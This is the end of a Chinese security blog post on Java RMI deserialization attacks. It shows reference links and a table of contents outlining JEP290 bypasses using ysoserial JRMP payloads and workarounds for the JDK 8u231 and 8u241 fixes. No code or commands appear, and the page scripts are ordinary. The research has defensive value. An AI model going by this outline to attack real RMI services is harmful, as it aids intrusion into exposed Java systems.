<p><a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p>
<p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p>
<p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
<p><a href="https://www.anquanke.com/post/id/204740" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204740</a></p>
<p><a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197829</a></p>
<p><a href="https://www.anquanke.com/post/id/199481" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199481</a></p>
<p><a href="https://blog.csdn.net/leehdsniper/article/details/71599504" target="_blank" rel="noopener">https://blog.csdn.net/leehdsniper/article/details/71599504</a></p>
<p><a href="http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/" target="_blank" rel="noopener">http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/</a></p>
<p><a href="https://www.anquanke.com/post/id/85681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85681</a></p>
<p><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a></p>
<p><a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank" rel="noopener">https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html</a></p>
<p><a href="https://xz.aliyun.com/t/2651" target="_blank" rel="noopener">https://xz.aliyun.com/t/2651</a></p>
<p><a href="https://xz.aliyun.com/t/2650" target="_blank" rel="noopener">https://xz.aliyun.com/t/2650</a></p>
<p><a href="https://xz.aliyun.com/t/2649" target="_blank" rel="noopener">https://xz.aliyun.com/t/2649</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用JRMP反序列化绕过JEP290"><span class="toc-number">2.</span> <span class="toc-text">利用JRMP反序列化绕过JEP290</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener"><span class="toc-number">2.1.</span> <span class="toc-text">JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#复现"><span class="toc-number">2.1.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI服务端反序列化攻击RMI注册端-Bind结合"><span class="toc-number">2.2.</span> <span class="toc-text">与RMI服务端反序列化攻击RMI注册端-Bind结合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRef对象"><span class="toc-number">2.2.1.</span> <span class="toc-text">UnicastRef对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#与bind操作进行拼接"><span class="toc-number">2.2.2.</span> <span class="toc-text">与bind操作进行拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-绕过客户端-自实现协议"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">1.绕过客户端-自实现协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-动态代理-自定义"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">2.动态代理-自定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-找一个带UnicastRef类型参数的实现Remote接口的类"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">3.找一个带UnicastRef类型参数的实现Remote接口的类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#RemoteObjectInvocationHandler"><span class="toc-number">2.2.2.4.1.</span> <span class="toc-text">RemoteObjectInvocationHandler</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RMIConnectionImpl-Stub"><span class="toc-number">2.2.2.4.2.</span> <span class="toc-text">RMIConnectionImpl_Stub</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UnicastRemoteObject"><span class="toc-number">2.2.2.4.3.</span> <span class="toc-text">UnicastRemoteObject</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了"><span class="toc-number">2.2.2.4.4.</span> <span class="toc-text">新的小问题-RemoteObjectInvocationHandler为啥又可以了</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#绕过序列化过程中的替换使所有类均可用于攻击"><span class="toc-number">2.2.2.4.5.</span> <span class="toc-text">绕过序列化过程中的替换使所有类均可用于攻击</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">4.带UnicastRef类型参数的实现Remote接口的类—自定义</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind的局限性"><span class="toc-number">2.2.3.</span> <span class="toc-text">bind的局限性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合"><span class="toc-number">2.3.</span> <span class="toc-text">与RMI客户端反序列化攻击RMI服务端-Lookup结合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于Barmie拦截器的自实现"><span class="toc-number">2.3.1.</span> <span class="toc-text">基于Barmie拦截器的自实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重实现lookup逻辑"><span class="toc-number">2.3.2.</span> <span class="toc-text">重实现lookup逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u231的修复"><span class="toc-number">2.4.</span> <span class="toc-text">8u231的修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一处修复"><span class="toc-number">2.4.1.</span> <span class="toc-text">第一处修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二处修复"><span class="toc-number">2.4.2.</span> <span class="toc-text">第二处修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#来自An-Trinh的另一种绕过JEP290的思路"><span class="toc-number">3.</span> <span class="toc-text">来自An Trinh的另一种绕过JEP290的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现—绕过8u231"><span class="toc-number">3.1.</span> <span class="toc-text">复现—绕过8u231</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u241的修复第一处"><span class="toc-number">3.2.</span> <span class="toc-text">8u241的修复第一处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind加上IP限制枷锁还可以用？"><span class="toc-number">3.3.</span> <span class="toc-text">bind加上IP限制枷锁还可以用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u241的修复第二处"><span class="toc-number">3.4.</span> <span class="toc-text">8u241的修复第二处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结-amp-总结"><span class="toc-number">4.</span> <span class="toc-text">小结&amp;总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&text=RMI-反序列化-深入-下"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&is_video=false&description=RMI-反序列化-深入-下"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI-反序列化-深入-下&body=Check out this article: http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&name=RMI-反序列化-深入-下&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 LaLa
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'lalajun';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
</html>
